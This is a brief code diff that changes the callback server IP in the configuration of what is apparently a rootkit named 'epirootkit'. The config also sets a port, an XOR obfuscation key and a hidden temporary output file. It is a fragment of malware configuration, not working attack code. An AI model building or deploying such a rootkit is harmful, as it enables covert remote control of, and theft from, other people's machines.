@@ -58,7 +58,7 @@ struct rootkit_config {
 
 static const struct rootkit_config config = {
     .port = 4242,
-    .server_ip = "10.0.2.2",
+    .server_ip = "192.168.15.6",
     .buffer_size = 1024,
     .xor_key = "epirootkit",
     .temp_output_file = "/tmp/.rk_out",
